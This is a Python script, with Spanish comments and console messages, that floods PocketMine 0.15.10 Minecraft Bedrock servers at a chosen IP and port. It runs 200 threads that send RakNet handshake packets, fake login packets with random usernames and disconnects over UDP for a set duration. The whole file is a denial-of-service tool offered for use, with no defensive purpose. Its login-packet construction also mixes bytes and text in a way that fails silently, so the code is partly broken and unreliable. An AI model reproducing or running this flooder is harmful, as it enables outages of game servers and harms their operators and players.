import socket
import zlib
import struct
import time
import random
import threading
import sys

if len(sys.argv) != 4:
    print("Uso: python3 pyraknet.py <ip> <port> <time>")
    sys.exit(1)

IP, PORT, DURATION = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])

MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
PROTOCOL_VERSION = 84

def crear_varint(val):
    total = b""
    while val >= 0x80:
        total += struct.pack("B", (val & 0x7F) | 0x80)
        val >>= 7
    total += struct.pack("B", val)
    return total

def spam_ilimitado(thread_id):
    global END_TIME
    client_guid = random.getrandbits(64)
    
    while time.time() < END_TIME:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        
        target = (IP, PORT)
        mtu = 1400
        
        try:
            # Handshake ultra-rápido
            sock.sendto(b'\x05'+MAGIC+struct.pack('B', PROTOCOL_VERSION)+b'\x00'*(mtu-18-16-1), target)
            sock.sendto(b'\x07'+MAGIC+struct.pack('>H', PORT)+b'\x00'*(mtu-18-16-2), target)
            
            ts = int(time.time()*1000)
            sock.sendto(b'\x09'+struct.pack('>Q', client_guid)+struct.pack('>Q', ts)+b'\x00', target)
            
            # Login directo (sin esperar respuestas)
            username = f"zJ_{random.randint(1000,9999)}_{thread_id}"
            login_pkt = b'\x01'+crear_varint(113)+b'{"chain":[{"identityPublicKey":"BK0KFgN2GJwFBygqMfwG0GO/0kT0j9k+4k8Z9j0k2m4n6p8r0t2v4x6z8","extraData":{"displayName":"'+username.encode()+'"}}]}'+b'{"ClientRandomId":'+str(random.getrandbits(32)).encode()+b',"GameVersion":"0.15.10"}'
            batch = crear_varint(1)+crear_varint(len(login_pkt))+login_pkt
            compressed = zlib.compress(batch)
            sock.sendto(b'\xfe'+struct.pack('<I', len(compressed))+compressed, target)
            
            sock.sendto(b'\x15', target)  # Disconnect
            
        except:
            pass
        
        sock.close()
        time.sleep(0.05)  # 50ms - ultra-ligero

END_TIME = time.time() + DURATION

print(f"🎯 **PocketMine 0.15.10 INFINITO** → {IP}:{PORT}")
print(f"⏱️ **{DURATION}s** | 🤖 **CONEXIONES ILIMITADAS** | 📡 **Protocol 84**")
print("🚀 **LIGERO + INFINITO** - Máxima velocidad!")

# 🔥 200 threads ligeros = conexiones INFINITAS
for i in range(200):
    t = threading.Thread(target=spam_ilimitado, args=(i,))
    t.daemon = True
    t.start()

print("💥 **200 FLOODERS ACTIVOS** - Corre ILIMITADO!")

try:
    while time.time() < END_TIME:
        time.sleep(1)
        print(f"⏳ Restante: {END_TIME-time.time():.0f}s", end='\r')
    print(f"\n✅ **{DURATION}s TERMINADOS** - ¡INFINITO completado!")
except KeyboardInterrupt:
    print("\n🛑 **Parado manual**")
